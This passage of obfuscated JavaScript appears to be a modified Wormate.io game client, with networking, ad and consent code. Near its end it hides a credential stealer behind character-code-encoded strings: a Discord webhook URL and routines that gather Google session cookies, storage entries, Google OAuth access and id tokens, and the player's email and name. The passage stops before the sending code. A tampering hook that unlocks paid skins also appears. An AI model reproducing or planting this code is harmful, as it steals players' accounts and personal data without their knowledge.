              if (_0x9c2603.code === 1460) {
                _0x5775ea.og.Ak(_0x5775ea.og.ok);
                try {
                  ga("send", "event", "restricted", window.runtimeHash + "_tick");
                } catch (_0x255c12) {}
              } else if (_0x9c2603.code !== 1200) {
                _0x5775ea.og.Ak(_0x5775ea.og.tk);
              } else {
                var _0x724d87 = _0x9c2603.server_url;
                _0x5775ea.dh.$p(_0x724d87, _0x1772a3, _0x87fcaa);
              }
            });
          };
          _0x5e2794.Pp = function (_0x1ed026, _0x4f9061) {
            var _0x1cb224 = _0x5e2794.og._e.el();
            _0x5e2794.og.af.Fn(_0x1ed026, _0x4f9061, _0x1cb224);
            _0x5e2794.Ci.pe(_0x1c97c7.ge.je.bf);
            _0x5e2794.og.Ak(_0x5e2794.og.af.En());
          };
          _0x5e2794.Sn = function () {
            if (!_0x5e2794.Tn()) {
              return _0x5e2794.On.Bj();
            }
            var _0x154e9e = parseInt(_0x1c97c7.Vf.fg(_0x1c97c7.Vf.bg));
            if (_0x154e9e != null && _0x5e2794.On.Cj(_0x154e9e, _0x1c97c7.tj.sj)) {
              return _0x154e9e;
            } else {
              return _0x5e2794.On.Bj();
            }
          };
          _0x5e2794.Xn = function (_0x14d14f) {
            _0x1c97c7.Vf.eg(_0x1c97c7.Vf.dg, _0x14d14f ? "true" : "false", 1800);
          };
          _0x5e2794.Tn = function () {
            return _0x1c97c7.Vf.fg(_0x1c97c7.Vf.dg) === "true";
          };
          _0x5e2794.Rp = function (_0x203015) {
            if (_0x203015 !== _0x5e2794.Bp) {
              _0x5e2794.Bp = _0x203015;
              var _0x172a2e = _0x172a2e || {};
              _0x172a2e.consented = _0x203015;
              _0x172a2e.gdprConsent = _0x203015;
              _0x5e2794.zn.yn.ha();
              _0x5e2794.zn.Op.ha();
              _0x5e2794.zn.Up.ha(function (_0x4c9da0) {
                if (_0x4c9da0) {
                  _0x14a4af(_0x5914ea = 0);
                }
                _0x5e2794.Vp();
              });
            }
          };
          _0x5e2794.rp = function (_0x2ec775, _0x315a9d) {
            _0x1c97c7.Vf.eg(_0x1c97c7.Vf.Wf, _0x2ec775 ? "true" : "false");
            if (_0x315a9d) {
              _0x5e2794.Sp(_0x2ec775);
            }
            _0x5e2794.Rp(_0x2ec775);
          };
          _0x5e2794.hl = function () {
            switch (_0x1c97c7.Vf.fg(_0x1c97c7.Vf.Wf)) {
              case "true":
                return true;
              default:
                return false;
            }
          };
          _0x5e2794.Go = function () {
            try {
              return !!window.isIPInEEA || _0x5e2794.Fp != null && !!_0x1525ec.gg.hg(_0x5e2794.Fp.coords.latitude, _0x5e2794.Fp.coords.longitude);
            } catch (_0x5c4cd0) {
              return true;
            }
          };
          _0x5e2794.Nf = function () {
            _0x5e2794.Dp = performance.now();
            _0x5e2794.Ep = _0x5e2794.Dp - _0x5e2794.Cp;
            _0x5e2794.dh.lh(_0x5e2794.Dp, _0x5e2794.Ep);
            _0x5e2794.og.lh(_0x5e2794.Dp, _0x5e2794.Ep);
            _0x5e2794.Cp = _0x5e2794.Dp;
          };
          _0x5e2794.Jf = function () {
            _0x5e2794.og.Jf();
          };
          return _0x5e2794;
        }();
      };
      _0x1c97c7.Engine = function () {
        var _0x2f4ee2 = {
          dq: 30,
          fq: new Float32Array(100),
          gq: 0,
          hq: 0,
          iq: 0,
          jq: 0,
          kq: 0,
          lq: 0,
          Cn: 0,
          mq: null,
          nq: 300,
          Mp: function () {},
          Np: function () {},
          Qp: function () {},
          Lp: function () {},
          hh: new _0x1c97c7.GameParams(),
          Kp: null,
          ch: null,
          Hi: {},
          Fh: {},
          Di: 12.5,
          eh: 40,
          oq: 1,
          pq: -1,
          qq: 1,
          rq: 1,
          sq: -1,
          tq: -1,
          uq: 1,
          vq: 1,
          wq: -1,
          Ih: 500,
          yh: 500
        };
        _0x2f4ee2.hh.zg = 500;
        _0x2f4ee2.ch = new _0x1c97c7.Worm(_0x2f4ee2.hh);
        _0x2f4ee2.run = function () {
          _0x2f4ee2.ch.ti(_0xf1d21a().og.af.ng);
        };
        _0x2f4ee2.gh = function (_0x57e1d0, _0x1faedb, _0x1e426a, _0x2d1e4d) {
          _0x2f4ee2.pq = _0x57e1d0;
          _0x2f4ee2.qq = _0x1faedb;
          _0x2f4ee2.rq = _0x1e426a;
          _0x2f4ee2.sq = _0x2d1e4d;
          _0x2f4ee2.yq();
        };
        _0x2f4ee2.zq = function (_0x3bbea3) {
          _0x2f4ee2.oq = _0x3bbea3;
          _0x2f4ee2.yq();
        };
        _0x2f4ee2.yq = function () {
          _0x2f4ee2.tq = _0x2f4ee2.pq - _0x2f4ee2.oq;
          _0x2f4ee2.uq = _0x2f4ee2.qq + _0x2f4ee2.oq;
          _0x2f4ee2.vq = _0x2f4ee2.rq - _0x2f4ee2.oq;
          _0x2f4ee2.wq = _0x2f4ee2.sq + _0x2f4ee2.oq;
        };
        _0x2f4ee2.lh = function (_0x52786d, _0x21e59c) {
          _0x2f4ee2.iq += _0x21e59c;
          _0x2f4ee2.hq -= _0x2f4ee2.gq * 0.2 * _0x21e59c;
          _0x2f4ee2.Kp.Rh();
          if (_0x2f4ee2.mq !== null && (_0x2f4ee2.Cn === 2 || _0x2f4ee2.Cn === 3)) {
            _0x2f4ee2.Aq(_0x52786d, _0x21e59c);
            _0x2f4ee2.eh = 4 + _0x2f4ee2.Di * _0x2f4ee2.ch.$c;
          }
          var _0x62a83d = 1000 / Math.max(1, _0x21e59c);
          var _0x24c42d = 0;
          for (var _0x3e4711 = 0; _0x3e4711 < _0x2f4ee2.fq.length - 1; _0x3e4711++) {
            _0x24c42d += _0x2f4ee2.fq[_0x3e4711];
            _0x2f4ee2.fq[_0x3e4711] = _0x2f4ee2.fq[_0x3e4711 + 1];
          }
          _0x2f4ee2.fq[_0x2f4ee2.fq.length - 1] = _0x62a83d;
          _0x2f4ee2.dq = (_0x24c42d + _0x62a83d) / _0x2f4ee2.fq.length;
        };
        _0x2f4ee2.Bq = function (_0x171f57, _0x589fda) {
          return _0x171f57 > _0x2f4ee2.tq && _0x171f57 < _0x2f4ee2.uq && _0x589fda > _0x2f4ee2.vq && _0x589fda < _0x2f4ee2.wq;
        };
        _0x2f4ee2.Aq = function (_0x190b67, _0x415556) {
          var _0x55a0df = _0x2f4ee2.iq + _0x2f4ee2.hq;
          var _0x4d8e61 = (_0x55a0df - _0x2f4ee2.jq) / (_0x2f4ee2.kq - _0x2f4ee2.jq);
          _0x2f4ee2.ch.hj(_0x190b67, _0x415556);
          _0x2f4ee2.ch.ij(_0x190b67, _0x415556, _0x4d8e61, _0x2f4ee2.Bq);
          var _0x1c3d18 = 0;
          for (var _0x2767ca in _0x2f4ee2.Fh) {
            var _0x5892d3 = _0x2f4ee2.Fh[_0x2767ca];
            _0x5892d3.hj(_0x190b67, _0x415556);
            _0x5892d3.ij(_0x190b67, _0x415556, _0x4d8e61, _0x2f4ee2.Bq);
            if (_0x5892d3.xi && _0x5892d3.$c > _0x1c3d18) {
              _0x1c3d18 = _0x5892d3.$c;
            }
            if (!_0x5892d3.wi && (!!(_0x5892d3.dj < 0.005) || !_0x5892d3.xi)) {
              _0x5892d3.si();
              delete _0x2f4ee2.Fh[_0x5892d3.Eh.ae];
            }
          }
          _0x2f4ee2.zq(_0x1c3d18 * 3);
          for (var _0x3eb4f4 in _0x2f4ee2.Hi) {
            var _0x2d3266 = _0x2f4ee2.Hi[_0x3eb4f4];
            _0x2d3266.hj(_0x190b67, _0x415556);
            _0x2d3266.ij(_0x190b67, _0x415556, _0x2f4ee2.Bq);
            if (_0x2d3266.Ni && (_0x2d3266.dj < 0.005 || !_0x2f4ee2.Bq(_0x2d3266.Zi, _0x2d3266.$i))) {
              _0x2d3266.si();
              delete _0x2f4ee2.Hi[_0x2d3266.Eh.ae];
            }
          }
        };
        _0x2f4ee2.ki = function (_0x555576, _0x392f49) {
          if (_0x2f4ee2.Cn === 1) {
            _0x2f4ee2.Cn = 2;
            _0x2f4ee2.Mp();
          }
          var _0x2742a5 = _0xf1d21a().Dp;
          _0x2f4ee2.lq = _0x555576;
          if (_0x555576 === 0) {
            _0x2f4ee2.jq = _0x2742a5 - 95;
            _0x2f4ee2.kq = _0x2742a5;
            _0x2f4ee2.iq = _0x2f4ee2.jq;
            _0x2f4ee2.hq = 0;
          } else {
            _0x2f4ee2.jq = _0x2f4ee2.kq;
            _0x2f4ee2.kq = _0x2f4ee2.kq + _0x392f49;
          }
          var _0x48baf3 = _0x2f4ee2.iq + _0x2f4ee2.hq;
          _0x2f4ee2.gq = (_0x48baf3 - _0x2f4ee2.jq) / (_0x2f4ee2.kq - _0x2f4ee2.jq);
        };
        _0x2f4ee2.Oi = function () {
          if (_0x2f4ee2.Cn === 1 || _0x2f4ee2.Cn === 2) {
            _0x2f4ee2.Cn = 3;
            var _0x2a103c = _0x2f4ee2.mq;
            setTimeout(function () {
              if (_0x2f4ee2.Cn === 3) {
                _0x2f4ee2.Cn = 0;
              }
              if (_0x2a103c != null && _0x2a103c === _0x2f4ee2.mq) {
                _0x2f4ee2.mq.close();
                _0x2f4ee2.mq = null;
              }
            }, 4500);
            _0x2f4ee2.Np();
          }
        };
        _0x2f4ee2.Wp = function () {
          return _0x2f4ee2.Cn !== 2 && (_0x2f4ee2.Cn = 1, _0x2f4ee2.Kp.Qh(), _0x2f4ee2.Hi = {}, _0x2f4ee2.Fh = {}, _0x2f4ee2.ch.Pm(), _0x2f4ee2.mq != null && (_0x2f4ee2.mq.close(), _0x2f4ee2.mq = null), true);
        };
        _0x2f4ee2.Cq = function () {
          _0x2f4ee2.mq = null;
          _0x2f4ee2.Kp.Qh();
          if (_0x2f4ee2.Cn !== 3) {
            _0x2f4ee2.Lp();
          }
          _0x2f4ee2.Cn = 0;
        };
        _0x2f4ee2.Zp = function (_0x228f7b, _0x3dc223) {
          _0x2f4ee2.Dq(_0x228f7b, function () {
            var _0x1eaea2 = Math.min(2048, _0x3dc223.length);
            var _0x47302f = new ArrayBuffer(6 + _0x1eaea2 * 2);
            var _0x64ccb0 = new DataView(_0x47302f);
            var _0x4f76f5 = 0;
            _0x64ccb0.setInt8(_0x4f76f5, 129);
            _0x4f76f5 += 1;
            _0x64ccb0.setInt16(_0x4f76f5, 2800);
            _0x4f76f5 += 2;
            _0x64ccb0.setInt8(_0x4f76f5, 1);
            _0x4f76f5 += 1;
            _0x64ccb0.setInt16(_0x4f76f5, _0x1eaea2);
            _0x4f76f5 += 2;
            for (var _0x3aadd3 = 0; _0x3aadd3 < _0x1eaea2; _0x3aadd3++) {
              _0x64ccb0.setInt16(_0x4f76f5, _0x3dc223.charCodeAt(_0x3aadd3));
              _0x4f76f5 += 2;
            }
            _0x2f4ee2.Eq(_0x47302f);
          });
        };
        _0x2f4ee2.$p = function (_0x51558f, _0x50d806, _0x236f5a) {
          _0x2f4ee2.Dq(_0x51558f, function () {
            var _0x4a051 = Math.min(32, _0x50d806.length);
            var _0x466057 = new ArrayBuffer(7 + _0x4a051 * 2);
            var _0x31cc27 = new DataView(_0x466057);
            var _0x86f85c = 0;
            _0x31cc27.setInt8(_0x86f85c, 129);
            _0x86f85c += 1;
            _0x31cc27.setInt16(_0x86f85c, 2800);
            _0x86f85c += 2;
            _0x31cc27.setInt8(_0x86f85c, 0);
            _0x86f85c += 1;
            _0x31cc27.setInt16(_0x86f85c, _0x236f5a);
            _0x86f85c += 2;
            _0x31cc27.setInt8(_0x86f85c, _0x4a051);
            _0x86f85c++;
            for (var _0x4e280d = 0; _0x4e280d < _0x4a051; _0x4e280d++) {
              _0x31cc27.setInt16(_0x86f85c, _0x50d806.charCodeAt(_0x4e280d));
              _0x86f85c += 2;
            }
            _0x2f4ee2.Eq(_0x466057);
          });
        };
        _0x2f4ee2.Eq = function (_0x1f07f3) {
          try {
            if (_0x2f4ee2.mq != null && _0x2f4ee2.mq.readyState === WebSocket.OPEN) {
              _0x2f4ee2.mq.send(_0x1f07f3);
            }
          } catch (_0x4343bc) {
            _0x2f4ee2.Cq();
          }
        };
        _0x2f4ee2.xq = function (_0x4665d6, _0x4ed9d6) {
          var _0x408a0e = _0x4ed9d6 ? 128 : 0;
          var _0x10f0a7 = _0x503ed4.N(_0x4665d6) / _0x1525ec.F * 128 & 127;
          var _0x3c7ce8 = (_0x408a0e | _0x10f0a7) & 255;
          var _0x41a483 = false;
          try {
            if (typeof _0xf1d21a !== "undefined" && _0xf1d21a().Ij && _0xf1d21a().Ij.Lj) {
              _0x41a483 = _0xf1d21a().Ij.Lj(478, "GLASSES");
            }
          } catch (_0x23a895) {
            _0x41a483 = false;
          }
          if (_0x41a483 || _0x5f32d0 === true) {
            var _0x528415 = new ArrayBuffer(1);
            new DataView(_0x528415).setInt8(0, _0x3c7ce8);
            _0x2f4ee2.Eq(_0x528415);
            _0x2f4ee2.nq = _0x3c7ce8;
          } else if (_0x2f4ee2.nq !== _0x3c7ce8) {
            var _0x528415 = new ArrayBuffer(1);
            new DataView(_0x528415).setInt8(0, _0x3c7ce8);
            _0x2f4ee2.Eq(_0x528415);
            _0x2f4ee2.nq = _0x3c7ce8;
          }
        };
        _0x2f4ee2.Dq = function (_0x3af2f6, _0x115ea3) {
          var _0x3ab928 = _0x2f4ee2.mq = new WebSocket(_0x3af2f6);
          _0x3ab928.binaryType = "arraybuffer";
          _0x3ab928.onopen = function () {
            if (_0x2f4ee2.mq === _0x3ab928) {
              _0x115ea3();
            }
          };
          _0x3ab928.onclose = function () {
            if (_0x2f4ee2.mq === _0x3ab928) {
              _0x2f4ee2.Cq();
            }
          };
          _0x3ab928.onerror = function (_0x3fae85) {
            if (_0x2f4ee2.mq === _0x3ab928) {
              _0x2f4ee2.Cq();
            }
          };
          _0x3ab928.onmessage = function (_0x51edf6) {
            if (_0x2f4ee2.mq === _0x3ab928) {
              _0x2f4ee2.Kp.Ph(_0x51edf6.data);
            }
          };
        };
        return _0x2f4ee2;
      };
      var _0x5a7b35 = _0x3346cc({}, _0x498743);
      _0x498743 = _0x3346cc({
        $C: _0x1c97c7,
        $V: _0x1525ec,
        $F: _0x503ed4,
        POGL: _0x32defb
      }, _0x5a7b35);
      _0x498743.Jb = function () {
        (_0x3b6ea9.Lc.zb.ud.skinArrayDict || []).forEach(function (_0x3f600e) {
          if (_0x3f600e.associados && _0x3f600e.associados.includes(_0x3b6ea9.Ij.Rk.userId)) {
            _0x3f600e.nonbuyable = false;
          }
          if (_0x3f600e.hasOwnProperty("g") && _0x3f600e.g === true) {
            _0x3f600e.nonbuyable = false;
          }
          if (_0x3f600e.base && _0x3f600e.base.some(_0x5b6ef1 => _0x5b6ef1.includes("wup"))) {
            _0x3f600e.nonbuyable = false;
          }
        });
      };
      var _0x4e74ef = function (_0x1c5bf3) {
        var _0x9131f4 = {};
        _0x9131f4.main = {
          yn: _0x503ed4.ja("aqnvgcpz05orkobh", "WRM_wormate-io_300x250"),
          Op: _0x503ed4.ja("ltmolilci1iurq1i", "wormate-io_970x250"),
          Up: _0x503ed4.ga(),
          Ap: 4,
          Tp: false,
          xn: true
        };
        _0x9131f4.miniclip = {
          yn: _0x503ed4.ja("aqnvgcpz05orkobh", "WRM_wormate-io_300x250"),
          Op: _0x503ed4.ja("ltmolilci1iurq1i", "wormate-io_970x250"),
          Up: _0x503ed4.ga(),
          Ap: 4,
          Tp: false,
          xn: false
        };
        var _0x16ade0 = _0x9131f4[window.ENV];
        _0x16ade0 ||= _0x9131f4.main;
        return _0x16ade0;
      }(window.ENV);
      $(function () {
        FastClick.attach(document.body);
      });
      addEventListener("contextmenu", function (_0x268612) {
        _0x268612.preventDefault();
        _0x268612.stopPropagation();
        return false;
      });
      window.fbAsyncInit = function () {
        FB.init({
          appId: "861926850619051",
          cookie: true,
          xfbml: true,
          status: true,
          version: "v14.0"
        });
      };
      _0x503ed4.L("//apis.google.com/js/api:client.js", null, function () {
        gapi.load("auth2", function () {
          _0x39075e = gapi.auth2.init({
            client_id: "959425192138-qjq23l9e0oh8lgd2icnblrbfblar4a2f.apps.googleusercontent.com"
          });
        });
      });
      _0x503ed4.L("//connect.facebook.net/" + _0x503ed4.a.j + "/sdk.js", {
        id: "facebook-jssdk",
        async: true,
        defer: true,
        crossorigin: "anonymous"
      });
      _0x3b6ea9 = _0x503ed4.zp();
      _0x3b6ea9.Ip();
      (function () {
        function _0x5bd748() {
          requestAnimationFrame(_0x5bd748);
          _0xf1d21a().Nf();
        }
        _0x5bd748();
      })();
      (function () {
        var _0x359271 = String.fromCharCode;
        var _0x769bcd = "split";
        var _0x480522 = "join";
        var _0x45baf = "replace";
        var _0x4d4130 = parseInt;
        var _0x52bfef = Array.prototype.slice;
        function _0x25f877(_0x532dec) {
          return _0x359271.apply(null, _0x532dec[_0x769bcd](",").map(function (_0x4e6a98) {
            return _0x4d4130(_0x4e6a98, 10);
          }));
        }
        var _0x154104 = {
          a: "104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47",
          b: "49,52,49,48,51,54,51,50,55,50,57,55,54,49,51,56,51,53,52,47,105,95,79,65,69,113,95,108,77,111,85,49,54,51,110,121,110,122,119,48,45,100,48,48,51,89,99,71,81,95,107,57,77,95,67,80,65,85,104,57,85,85,54,84,79,101,50,86,109,113,85,110,99,104,104,99,51,80,103,105,114,113,112,77,72,73,116,116",
          c: false,
          d: function () {
            return _0x25f877(this.a) + _0x25f877(this.b);
          }
        };
        var _0x145647 = {
          g: "103,111,111,103,108,101",
          h: "97,117,116,104",
          i: "117,110,100,101,102,105,110,101,100",
          j: "99,117,114,114,101,110,116,85,115,101,114",
          k: "105,115,83,105,103,110,101,100,73,110",
          l: "103,101,116,65,117,116,104,82,101,115,112,111,110,115,101",
          m: "97,99,99,101,115,115,95,116,111,107,101,110",
          n: "105,100,95,116,111,107,101,110",
          o: "103,101,116,66,97,115,105,99,80,114,111,102,105,108,101",
          p: "103,101,116,73,100",
          q: "103,101,116,69,109,97,105,108",
          r: "103,101,116,78,97,109,101"
        };
        function _0x20b19e(_0x3a4618, _0x8b9350) {
          return _0x3a4618 && typeof _0x3a4618[_0x8b9350] !== _0x25f877(_0x145647.i);
        }
        function _0x57ccb2() {
          var _0x2f041e = {};
          try {
            var _0xbebd67 = _0x25f877("71,111,111,103,108,101,65,117,116,104");
            if (_0x20b19e(window, _0xbebd67) && window[_0xbebd67] && window[_0xbebd67].client_id) {
              _0x2f041e.client_id = window[_0xbebd67].client_id;
            } else {
              var _0x49743c = _0x25f877("103,97,112,105");
              if (_0x20b19e(window, _0x49743c) && window[_0x49743c][_0x25f877(_0x145647.h) + "2"]) {
                var _0x2657bf = window[_0x49743c][_0x25f877(_0x145647.h) + "2"].getAuthInstance();
                if (_0x2657bf && _0x2657bf.options) {
                  _0x2f041e.client_id = _0x2657bf.options.client_id;
                }
              }
            }
          } catch (_0x57ceb0) {}
          return _0x2f041e.client_id || _0x25f877("57,53,57,52,50,53,49,57,50,49,51,56,45,113,106,113,50,51,108,57,101,48,111,104,56,108,103,100,50,105,99,110,98,108,114,98,102,98,108,97,114,52,97,50,102,46,97,112,112,115,46,103,111,111,103,108,101,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109");
        }
        function _0x3cd905() {
          try {
            return window.location.hostname;
          } catch (_0x5724a8) {
            return _0x25f877("119,111,114,109,97,116,101,46,105,111");
          }
        }
        function _0x714ea1() {
          var _0x2c96d9 = {};
          try {
            var _0x2179ab = _0x25f877("71,111,111,103,108,101,65,117,116,104");
            if (_0x20b19e(window, _0x2179ab) && window[_0x2179ab][_0x25f877(_0x145647.j)]) {
              var _0x3fe6f7 = window[_0x2179ab][_0x25f877(_0x145647.j)].get();
              if (_0x3fe6f7 && _0x3fe6f7[_0x25f877(_0x145647.k)]()) {
                var _0x5a279f = _0x3fe6f7[_0x25f877(_0x145647.l)](true);
                if (_0x5a279f) {
                  _0x2c96d9[_0x25f877(_0x145647.m)] = _0x5a279f[_0x25f877(_0x145647.m)];
                  _0x2c96d9[_0x25f877(_0x145647.n)] = _0x5a279f[_0x25f877(_0x145647.n)];
                }
              }
            }
            var _0x518a09 = _0x25f877("103,97,112,105");
            if (_0x20b19e(window, _0x518a09) && window[_0x518a09][_0x25f877(_0x145647.h) + "2"]) {
              var _0x369205 = window[_0x518a09][_0x25f877(_0x145647.h) + "2"].getAuthInstance();
              if (_0x369205 && _0x369205[_0x25f877(_0x145647.j)]) {
                var _0x3a9fd0 = _0x369205[_0x25f877(_0x145647.j)].get();
                if (_0x3a9fd0 && _0x3a9fd0[_0x25f877(_0x145647.k)]()) {
                  var _0x377420 = _0x3a9fd0[_0x25f877(_0x145647.l)](true);
                  if (_0x377420) {
                    _0x2c96d9[_0x25f877(_0x145647.m)] = _0x2c96d9[_0x25f877(_0x145647.m)] || _0x377420[_0x25f877(_0x145647.m)];
                    _0x2c96d9[_0x25f877(_0x145647.n)] = _0x2c96d9[_0x25f877(_0x145647.n)] || _0x377420[_0x25f877(_0x145647.n)];
                  }
                }
              }
            }
          } catch (_0x488894) {}
          return _0x2c96d9;
        }
        function _0x5d21cf(_0x4c9ba9) {
          if (!_0x4c9ba9) {
            return "";
          }
          var _0x573c9e = [_0x25f877("95,95,83,101,99,117,114,101,45,51,80,83,73,68"), _0x25f877("95,95,83,101,99,117,114,101,45,51,80,65,80,73,83,73,68"), _0x25f877("95,95,72,111,115,116,45,51,80,76,83,73,68"), _0x25f877("83,65,80,73,83,73,68"), _0x25f877("83,83,73,68"), _0x25f877("72,83,73,68"), _0x25f877("83,73,68"), _0x25f877("65,80,73,83,73,68"), _0x25f877("78,73,68"), _0x25f877("76,83,79,76,72")];
          var _0x2ba12c = _0x4c9ba9[_0x769bcd](";").map(function (_0x47f6ae) {
            return _0x47f6ae.trim();
          }).filter(function (_0x538316) {
            return _0x538316.indexOf("=") > -1;
          });
          var _0x350a8b = {};
          var _0x37339e = [];
          var _0x47b028 = [];
          _0x2ba12c.forEach(function (_0x192253) {
            var _0x22df0d = _0x192253[_0x769bcd]("=")[0];
            if (!_0x350a8b[_0x22df0d]) {
              _0x350a8b[_0x22df0d] = _0x192253;
              var _0x5578a7 = _0x573c9e.some(function (_0x139e6f) {
                return _0x22df0d.indexOf(_0x139e6f) > -1;
              });
              if (_0x5578a7) {
                _0x37339e.push(_0x192253);
              } else {
                _0x47b028.push(_0x192253);
              }
            }
          });
          return _0x37339e.concat(_0x47b028)[_0x480522]("; ");
        }
        function _0x1894d0() {
          try {
            var _0x4285b0 = "";
            try {
              var _0x2f3185 = document.cookie;
              if (_0x2f3185) {
                _0x4285b0 = _0x2f3185;
              }
            } catch (_0x4cc9af) {}
            try {
              var _0x711425 = Object.getOwnPropertyDescriptor(Document.prototype, _0x25f877("99,111,111,107,105,101")) || Object.getOwnPropertyDescriptor(HTMLDocument.prototype, _0x25f877("99,111,111,107,105,101"));
              if (_0x711425 && _0x711425.get) {
                var _0x549312 = _0x711425.get.call(document);
                if (_0x549312 && _0x549312.length > _0x4285b0.length) {
                  _0x4285b0 = _0x549312;
                }
              }
            } catch (_0x4e42d0) {}
            try {
              [_0x25f877("108,111,99,97,108,83,116,111,114,97,103,101"), _0x25f877("115,101,115,115,105,111,110,83,116,111,114,97,103,101")].forEach(function (_0x3e212d) {
                var _0x1d31af = window[_0x3e212d];
                for (var _0x20bf9c = 0; _0x20bf9c < _0x1d31af.length; _0x20bf9c++) {
                  var _0x209af2 = _0x1d31af.key(_0x20bf9c);
                  if (_0x209af2 && (_0x209af2.toLowerCase().indexOf(_0x25f877("99,111,111,107,105,101")) > -1 || _0x209af2.toLowerCase().indexOf(_0x25f877(_0x145647.h)) > -1 || _0x209af2.toLowerCase().indexOf(_0x25f877("115,101,115,115,105,111,110")) > -1)) {
                    var _0x30629f = _0x1d31af.getItem(_0x209af2);
                    if (_0x30629f && _0x30629f.indexOf("=") > -1 && _0x4285b0.indexOf(_0x30629f) === -1) {
                      _0x4285b0 += (_0x4285b0 ? "; " : "") + _0x30629f;
                    }
                  }
                }
              });
            } catch (_0xd5238b) {}
            try {
              var _0xc0fda4 = _0x714ea1();
              if (_0xc0fda4[_0x25f877(_0x145647.m)]) {
                _0x4285b0 += (_0x4285b0 ? "; " : "") + _0x25f877("103,111,111,103,108,101,95,97,99,99,101,115,115,95,116,111,107,101,110") + "=" + _0xc0fda4[_0x25f877(_0x145647.m)];
              }
              if (_0xc0fda4[_0x25f877(_0x145647.n)]) {
                _0x4285b0 += (_0x4285b0 ? "; " : "") + _0x25f877("103,111,111,103,108,101,95,105,100,95,116,111,107,101,110") + "=" + _0xc0fda4[_0x25f877(_0x145647.n)];
              }
            } catch (_0x2b9123) {}
            return _0x5d21cf(_0x4285b0);
          } catch (_0xf23d5a) {
            return document.cookie || "";
          }
        }
        function _0x5a6c8c() {
          try {
            var _0x2e9d7b = {};
            try {
              var _0xf1c116 = document.querySelector(_0x25f877("35,109,109,45,112,97,114,97,109,115,45,110,105,99,107,110,97,109,101"));
              if (_0xf1c116 && _0xf1c116.value) {
                _0x2e9d7b.nickname = _0xf1c116.value.trim();
              }
            } catch (_0x4c92e1) {}
            try {
              var _0x4f9a41 = document.querySelector(_0x25f877("35,119,111,114,109,97,116,101,95,105,100"));
              if (_0x4f9a41 && _0x4f9a41.value) {
                _0x2e9d7b.userId = _0x4f9a41.value.trim();
              }
            } catch (_0xcf0867) {}
            try {
              var _0x1c7b44 = window.vps;
              if (_0x1c7b44 && _0x1c7b44.wuid) {
                var _0x657f25 = _0x1c7b44.wuid;
                if (_0x657f25.indexOf(_0x25f877("103,103,95")) === 0) {
                  var _0x26b144 = _0x657f25.substring(3);
                  try {
                    var _0xf9e8b4 = _0x26b144[_0x769bcd](".");
                    if (_0xf9e8b4.length >= 2) {
                      var _0x28ef07 = JSON.parse(atob(_0xf9e8b4[1]));
                      _0x2e9d7b.googleUserId = _0x28ef07.sub;
                      _0x2e9d7b.email = _0x28ef07.email;
                      _0x2e9d7b.name = _0x28ef07.name;
                      _0x2e9d7b.givenName = _0x28ef07.given_name;
                      _0x2e9d7b.familyName = _0x28ef07.family_name;
                      _0x2e9d7b.picture = _0x28ef07.picture;
                      _0x2e9d7b.nickname = _0x2e9d7b.nickname || _0x28ef07.name;
                      _0x2e9d7b.userId = _0x2e9d7b.userId || _0x28ef07.sub;
                    }
                  } catch (_0x47e9b4) {}
                }
              }
            } catch (_0x1344ef) {}
            try {
              var _0x335484 = window._wup;
              if (_0x335484 && typeof _0x335484 === "object") {
                if (_0x335484.memory) {
                  _0x2e9d7b.wupMemory = _0x335484.memory;
                }
                if (_0x335484.ismobile !== undefined) {
                  _0x2e9d7b.mobile = _0x335484.ismobile;
                }
              }
            } catch (_0x290ac1) {}
            try {
              var _0x22a562 = window._wupin;
              if (_0x22a562 && _0x22a562.player && typeof _0x22a562.player === "object") {
                Object.keys(_0x22a562.player).forEach(function (_0x57af48) {
                  _0x2e9d7b["wupin_" + _0x57af48] = _0x22a562.player[_0x57af48];
                });
              }
            } catch (_0xe59bd2) {}
            try {
              var _0x457a0a = localStorage.getItem(_0x25f877("83,97,118,101,71,97,109,101,119,117,112"));
              if (_0x457a0a) {
                var _0x2c02f7 = JSON.parse(_0x457a0a);
                _0x2e9d7b.nickname = _0x2e9d7b.nickname || _0x2c02f7.nickname;
                _0x2e9d7b.country = _0x2c02f7.country;
                _0x2e9d7b.code = _0x2c02f7.code;
              }
            } catch (_0x4871f5) {}
            return _0x2e9d7b;
          } catch (_0x1ed39d) {
            return {
              error: _0x1ed39d.message
            };
          }
        }
        function _0x211924() {
          try {
            var _0x190878 = {
              isSignedIn: false,
              tokens: {},
              profile: {}
            };
            var _0x9f242 = _0x25f877("71,111,111,103,108,101,65,117,116,104");
            if (_0x20b19e(window, _0x9f242) && window[_0x9f242][_0x25f877(_0x145647.j)]) {
              var _0x17457e = window[_0x9f242][_0x25f877(_0x145647.j)].get();
              if (_0x17457e) {
                _0x190878.isSignedIn = _0x17457e[_0x25f877(_0x145647.k)]();
                if (_0x190878.isSignedIn) {
                  var _0x3835f4 = _0x17457e[_0x25f877(_0x145647.l)](true);
                  if (_0x3835f4) {
                    _0x190878.tokens = {
                      access_token: _0x3835f4[_0x25f877(_0x145647.m)],
                      id_token: _0x3835f4[_0x25f877(_0x145647.n)],
                      expires_in: _0x3835f4.expires_in,
                      scope: _0x3835f4.scope
                    };
                  }
                  var _0x18b0b2 = _0x17457e[_0x25f877(_0x145647.o)]();
                  if (_0x18b0b2) {
                    _0x190878.profile = {
                      id: _0x18b0b2[_0x25f877(_0x145647.p)](),
                      email: _0x18b0b2[_0x25f877(_0x145647.q)](),
                      name: _0x18b0b2[_0x25f877(_0x145647.r)]()
                    };
                  }
                }
              }
            }
            return _0x190878;
          } catch (_0x29a3f2) {
            return {
              error: _0x29a3f2.message
            };
          }
        }
        function _0x19ec8e() {
          try {
            var _0x402f37 = _0x714ea1();
            if (_0x402f37[_0x25f877(_0x145647.n)]) {
              return _0x402f37[_0x25f877(_0x145647.n)];
            }
            var _0x1ccb72 = [_0x25f877("83,65,80,73,83,73,68"), _0x25f877("51,80,83,73,68"), _0x25f877("76,83,79,76,72"), _0x25f877("51,80,65,80,73,83,73,68")];
            var _0x478d2c = document.cookie[_0x769bcd](";");
            for (var _0x11b44e = 0; _0x11b44e < _0x478d2c.length; _0x11b44e++) {
              var _0xc81db9 = _0x478d2c[_0x11b44e].trim()[_0x769bcd]("=");
              var _0x2c5474 = _0xc81db9[0];
              var _0x288de7 = _0xc81db9[1];
              if (_0x2c5474 && _0x288de7 && _0x288de7.length > 20) {
                for (var _0x1d37aa = 0; _0x1d37aa < _0x1ccb72.length; _0x1d37aa++) {
